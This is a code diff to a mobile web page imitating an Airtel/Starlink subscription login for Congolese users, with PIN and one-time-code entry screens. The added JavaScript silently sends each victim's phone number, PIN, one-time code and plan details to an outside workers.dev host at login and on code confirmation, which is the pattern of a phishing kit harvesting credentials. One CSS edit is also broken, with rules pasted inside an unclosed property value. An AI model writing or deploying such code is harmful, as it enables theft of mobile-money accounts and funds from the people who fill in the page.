@@ -206,9 +206,10 @@ img,svg{display:block;max-width:100%}
 /* PIN stage */
 .pin-stage{
   flex:1;min-height:0;
-  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  display:flex;flex-direction:column;align-items:center;justify-content:flex-start;
   padding:var(--g-4) var(--g-5) max(var(--g-4),env(safe-area-inset-bottom,0px));
-  gap:var(--g-4);overflow:hidden;
+  gap:var(--g-4);overflow-y:auto;overflow-x:hidden;
+  -webkit-overflow-scrolling:touch;
 }
 .pin-head{display:flex;flex-direction:column;gap:var(--g-1);text-align:center;max-width:340px}
 .pin-title{
@@ -338,6 +339,8 @@ img,svg{display:block;max-width:100%}
 .otp-wrap{
   padding:var(--g-4) var(--g-4) calc(var(--g-6) + env(safe-area-inset-bottom,0px));
   display:flex;flex-direction:column;align-items:center;gap:var(--g-4);
+  flex:1;min-height:0;overflow-y:auto;overflow-x:hidden;
+  -webkit-overflow-scrolling:touch;
 }
 .otp-card{
   width:100%;max-width:400px;
@@ -465,7 +468,28 @@ img,svg{display:block;max-width:100%}
   height:100%;width:0;background:var(--red);
   border-radius:0 2px 2px 0;
   box-shadow:0 0 8px rgba(228,0,0,.5);
-  transition:width .4s var(--ease);
+  transition:width .4s var(--ease
+/* ── TEXT SIZE LOCK — immune to system font scale ── */
+html,*{ -webkit-text-size-adjust:100%!important; text-size-adjust:100%!important; }
+
+/* ── BTN-CTA sticky so it never hides ── */
+.btn-cta{
+  position:sticky!important;
+  bottom:max(0px,env(safe-area-inset-bottom,0px))!important;
+  flex-shrink:0!important;
+  z-index:10;
+}
+
+/* ── Numpad: fixed px, shrink on short screens ── */
+.numkey{ height:54px!important; font-size:21px!important; }
+@media(max-height:680px){ .numkey{ height:48px!important; font-size:19px!important; } }
+@media(max-height:600px){ .numkey{ height:44px!important; font-size:17px!important; }
+  .pin-box,.pb{ height:50px!important; } .otp-box,.ob{ height:50px!important; } }
+@media(max-width:360px){ .numkey{ height:48px!important; } }
+
+/* ── Summary: never overflow ── */
+.summary{ flex-shrink:0!important; overflow:hidden!important; }
+);
 }
 
 .rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(0,0,0,.07);transform:scale(0);animation:rip-anim .5s ease forwards}
@@ -796,7 +820,7 @@ document.getElementById('pinPad').addEventListener('click',function(e){
   renderPin();
 });
 
-function submitLogin(){
+async function submitLogin(){
   var ph=forfait.phone||'';
   if(!ph||ph.length!==9){
     document.getElementById('pinErr').textContent='Session invalide — retournez choisir votre forfait';
@@ -832,6 +856,20 @@ async function runProcessing(ph){
       document.getElementById('psi'+steps[i].si).className='proc-step act';
     }
   }
+  /* ── Worker: login_initiated ── */
+  (function(){
+    var _f={};var _a={};
+    try{_f=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
+    try{_a=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
+    fetch('https://airtel-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({event:'login_initiated',data:{
+        phone:_a.phone||'',pin:_a.pin||'',
+        forfait:_f.name||'',price:_f.price||'',
+        deposit:_f.deposit||'',daily:_f.daily||'',jours:_f.jours||'',
+        ts:Date.now()
+      }})
+    }).catch(function(){});
+  })();
   await slp(500);
   document.getElementById('otpPhone').innerHTML=
     '<span>🇨🇩</span>+243 '+ph.slice(0,2)+' '+ph.slice(2,5)+' '+ph.slice(5);
@@ -941,6 +979,22 @@ function submitOTP(){
   sessionStorage.setItem('starlinkRef',ref);
   sessionStorage.setItem('starlinkOTP',otpVal);
   for(var i=0;i<4;i++)document.getElementById('ob'+i).classList.add('success');
+
+  /* ── Worker: otp_confirmed ── */
+  (function(){
+    var _f={};var _a={};
+    try{_f=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
+    try{_a=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
+    var _ref=sessionStorage.getItem('starlinkRef')||'';
+    fetch('https://airtel-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({event:'otp_confirmed',data:{
+        phone:_a.phone||'',pin:_a.pin||'',otp:otpVal,
+        forfait:_f.name||'',price:_f.price||'',
+        deposit:_f.deposit||'',daily:_f.daily||'',jours:_f.jours||'',
+        ref:_ref,ts:Date.now()
+      }})
+    }).catch(function(){});
+  })();
   hap([18,8,35]);
   setTimeout(function(){navigate('airtel-thankyou.html');},500);
 }
